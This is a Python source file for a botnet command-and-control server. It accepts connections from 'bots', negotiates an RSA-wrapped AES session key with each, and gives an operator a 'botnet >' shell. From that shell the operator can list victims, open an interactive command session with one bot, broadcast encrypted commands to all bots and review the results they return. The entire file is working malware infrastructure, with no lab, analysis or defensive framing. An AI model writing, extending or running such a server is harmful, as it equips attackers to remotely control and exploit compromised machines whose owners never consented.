import socket
import threading
import time
import os

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

class C2Server:
    def __init__(self, ip="192.168.126.133", port=443):
        self.ip = ip
        self.port = port
        self.s = None

        self.clients = []
        self.results_db = {}

        # Initialize thread synchronization
        self.lock = threading.Lock()
        self.client_counter = 0
        self.active_interactive_id = None

        # Load RSA private key
        self.private_key = self.load_private_key()

    def load_private_key(self):
        if not os.path.exists("c2_private.pem"):
            print("[-] FATAL: private key NOT found.")
            exit(1)

        with open("c2_private.pem", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

        return private_key

    # Encrypt outgoing data with AES-CBC
    def aes_encrypt(self, data, aes_key):
        if isinstance(data, str):
            data = data.encode('utf-8')

        iv = os.urandom(16)

        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.CBC(iv),
            backend=default_backend()
        )

        encryptor = cipher.encryptor()

        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        return iv + ciphertext

    # Decrypt incoming AES-CBC packets
    def aes_decrypt(self, data, aes_key):
        try:
            iv = data[:16]
            ciphertext = data[16:]

            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )

            decryptor = cipher.decryptor()

            padded_data = decryptor.update(ciphertext) + decryptor.finalize()

            unpadder = sym_padding.PKCS7(128).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()

            return data

        except Exception as e:
            print(f"\n[-] Decryption error: {e}")
            return b""

    # Receive exact amount of bytes from TCP stream
    def recv_exact(self, conn, count):
        buf = b''

        while len(buf) < count:
            newbuf = conn.recv(count - len(buf))

            if not newbuf:
                return None

            buf += newbuf

        return buf

    # Initialize server socket
    def create_socket(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        except socket.error as msg:
            print(f"[-] Error in socket creation: {msg}")
            exit(1)

    # Bind server socket and start listening
    def bind_socket(self):
        print(f"[*] Server initialized on {self.ip}:{self.port}")

        while True:
            try:
                self.s.bind((self.ip, self.port))
                self.s.listen(5)
                break

            except socket.error as msg:
                print(f"[-] Bind error: {msg}. Retrying in 5 seconds...")
                time.sleep(5)

    # Handle encrypted responses from connected clients
    def handle_bot_response(self, conn, bot_id, aes_key):
        while True:
            try:
                data = conn.recv(20480)

                if not data:
                    break

                decrypted_data = self.aes_decrypt(data, aes_key)

                if not decrypted_data:
                    break

                response = decrypted_data.decode("utf-8", errors="replace")
                timestamp = time.strftime("%H:%M:%S")

                with self.lock:
                    if bot_id not in self.results_db:
                        self.results_db[bot_id] = []

                    self.results_db[bot_id].append(f"[{timestamp}]: {response}")

                print(f"\n[!] Response from bot {bot_id}:\n{response}")
                with self.lock:
                    active_id = self.active_interactive_id
                if active_id is not None:
                    print(f"bot-{active_id} > ", end="", flush=True)
                else:
                    print("botnet > ", end="", flush=True)

            except Exception:
                break

        # Cleanup disconnected client
        self.remove_client(bot_id)

    # Remove disconnected client from active list
    def remove_client(self, target_id):
        with self.lock:
            for client in self.clients:
                if client[2] == target_id:
                    client[0].close()
                    self.clients.remove(client)

                    print(f"\n[-] Bot {target_id} disconnected.")
                    active_id = self.active_interactive_id
                    if active_id is not None and active_id != target_id:
                        print(f"bot-{active_id} > ", end="", flush=True)
                    else:
                        print("botnet > ", end="", flush=True)

                    break

    # Accept incoming client connections
    def accept_connections(self):
        while True:
            try:
                conn, address = self.s.accept()
                conn.setblocking(True)

                print(f"\n[*] Incoming connection from {address[0]}:{address[1]}. Negotiating encryption...")

                # Receive encrypted AES session key
                enc_session_key = self.recv_exact(conn, 256)

                if not enc_session_key:
                    conn.close()
                    continue

                try:
                    # Decrypt session key using RSA private key
                    aes_key = self.private_key.decrypt(
                        enc_session_key,
                        rsa_padding.PKCS1v15()
                    )

                except Exception:
                    print(f"[-] Handshake failed (Invalid RSA block) from {address[0]}. Dropping connection.")
                    conn.close()
                    continue

                # Register connected client
                with self.lock:
                    bot_id = self.client_counter
                    self.client_counter += 1

                    self.clients.append((conn, address, bot_id, aes_key))

                # Start response handler thread
                t = threading.Thread(
                    target=self.handle_bot_response,
                    args=(conn, bot_id, aes_key)
                )

                t.daemon = True
                t.start()

                print(f"[+] Secure session established! Bot ID: {bot_id}")
                with self.lock:
                    active_id = self.active_interactive_id
                if active_id is not None:
                    print(f"bot-{active_id} > ", end="", flush=True)
                else:
                    print("botnet > ", end="", flush=True)

            except Exception as e:
                print(f"\n[-] Error accepting connection: {e}")

    # Display connected clients
    def list_connections(self):
        print("\n----- Online Bots -----")

        with self.lock:
            if not self.clients:
                print("No bots currently connected.")

            for conn, address, bot_id, aes_key in self.clients:
                print(f"ID: {bot_id} | IP: {address[0]}:{address[1]} | SECURE: YES")

        print("-----------------------\n")

    # Interactive shell for a selected client
    def interactive_session(self, target_id):
        target_conn = None
        target_ip = ""
        target_key = None

        with self.lock:
            for conn, address, bot_id, aes_key in self.clients:
                if bot_id == target_id:
                    target_conn = conn
                    target_ip = address[0]
                    target_key = aes_key
                    break

        if not target_conn:
            print(f"[-] Bot {target_id} not found or disconnected.")
            return

        print(f"\n[*] Entering interactive session with Bot {target_id} ({target_ip})")
        print("[*] Type 'back' to return to the main menu.\n")

        with self.lock:
            self.active_interactive_id = target_id

        try:
            while True:
                try:
                    cmd = input(f"bot-{target_id} > ").strip()

                    if not cmd:
                        continue

                    if cmd.lower() == 'back':
                        break

                    # Encrypt command before transmission
                    enc_com = self.aes_encrypt(cmd, target_key)
                    target_conn.send(enc_com)

                except Exception as e:
                    print(f"[-] Connection to Bot {target_id} lost: {e}")
                    self.remove_client(target_id)
                    break
        finally:
            with self.lock:
                self.active_interactive_id = None

    # Main command shell
    def start_shell(self):
        time.sleep(0.5)

        while True:
            try:
                cmd = input("botnet > ").strip()

                if not cmd:
                    continue

                if cmd == 'list':
                    self.list_connections()

                elif cmd.startswith('broadcast '):
                    instruction = cmd[10:]

                    with self.lock:
                        for conn, addr, bot_id, aes_key in self.clients:
                            try:
                                enc_command = self.aes_encrypt(instruction, aes_key)
                                conn.send(enc_command)

                            except:
                                pass

                    print(f"[*] Broadcasted '{instruction}' securely to all bots.")

                elif cmd.startswith('results'):
                    parts = cmd.split()

                    if len(parts) == 2 and parts[1].isdigit():
                        target_id = int(parts[1])

                        with self.lock:
                            if target_id in self.results_db and self.results_db[target_id]:
                                print(f"\n--- Results for Bot {target_id} ---")

                                for r in self.results_db[target_id]:
                                    print(r)

                                print("---------------------------")

                            else:
                                print("[-] No results found for this ID.")

                    else:
                        print("Usage: results <id>")

                elif cmd.startswith('select'):
                    parts = cmd.split()

                    if len(parts) == 2 and parts[1].isdigit():
                        target_id = int(parts[1])
                        self.interactive_session(target_id)

                    else:
                        print("Usage: select <id>")

                elif cmd in ['exit', 'quit']:
                    print("[*] Shutting down C2 server gracefully...")

                    with self.lock:
                        for conn, addr, bot_id, aes_key in self.clients:
                            conn.close()

                    self.s.close()
                    break

                elif cmd == "help":
                    print("\n--- Command Menu ---")
                    print("  list                  : List all connected bots")
                    print("  select <id>           : Enter interactive shell with a specific bot")
                    print("  broadcast <command>   : Send a command to all bots")
                    print("  results <id>          : Show execution results from a specific bot")
                    print("  clear                 : Clear the screen")
                    print("  exit                  : Shutdown C2")
                    print("--------------------\n")

                elif cmd == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')

                else:
                    print("[-] Unknown command. Type 'help' for options.")

            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to gracefully shutdown.")

    # Start server components
    def run(self):
        self.create_socket()
        self.bind_socket()

        t = threading.Thread(target=self.accept_connections)
        t.daemon = True
        t.start()

        self.start_shell()


if __name__ == "__main__":
    server = C2Server()
    server.run()

